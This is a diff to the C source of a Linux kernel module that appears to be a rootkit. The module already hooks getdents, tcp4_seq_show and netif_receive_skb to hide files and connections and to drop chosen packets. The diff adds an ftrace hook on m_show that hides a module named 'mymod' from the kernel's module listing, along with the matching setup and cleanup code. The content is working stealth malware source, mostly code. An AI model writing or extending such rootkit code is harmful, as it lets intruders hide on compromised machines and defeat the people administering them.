@@ -35,10 +35,12 @@
 #define DROP_SIP "\x08\x08\x08\x08"
 #define DROP_ARP_SIP "\x0a\x00\x00\xfa"
 #define DROP_SPORT 5999
+#define HIDDEN_MOD_NAME "mymod"
 
 #include "hook_functions/tcp_seq_show.c"
 #include "hook_functions/getdents.c"
 #include "hook_functions/netif_receive_skb.c"
+#include "hook_functions/m_show.c"
 
 typedef enum {
         FAILED_TO_SET_SYSTEM_HOOKS = -1,
@@ -54,6 +56,11 @@ static struct ftrace_hook netif_fhook = {
 static struct ftrace_hook tcp_seq_show_fhook = {
     .hook_func = hook_tcp4_seq_show,
     .orig_func_pointer = (void**)&org_tcp4_seq_show,
+};
+
+static struct ftrace_hook m_show_fhook = {
+    .hook_func = hook_m_show,
+    .orig_func_pointer = (void**)&org_m_show,
 };
 
 static struct sys_hook sys_hooks[] = {
@@ -88,6 +95,15 @@ int init_module(void)
         undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
         return FAILED_TO_SET_FHOOK_HOOK;
     }
+
+    res = set_ftrace_hook("m_show", &m_show_fhook);
+    if (res != 0){
+        printk("failed to set m_show hook");
+        undo_ftrace_hook(&tcp_seq_show_fhook);
+        undo_ftrace_hook(&netif_fhook);
+        undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
+        return FAILED_TO_SET_FHOOK_HOOK;
+    }
     return 0;
 }
 
@@ -96,6 +112,7 @@ void cleanup_module(void)
     undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
     undo_ftrace_hook(&tcp_seq_show_fhook);
     undo_ftrace_hook(&netif_fhook);
+    undo_ftrace_hook(&m_show_fhook);
 }
 
 MODULE_LICENSE("GPL");
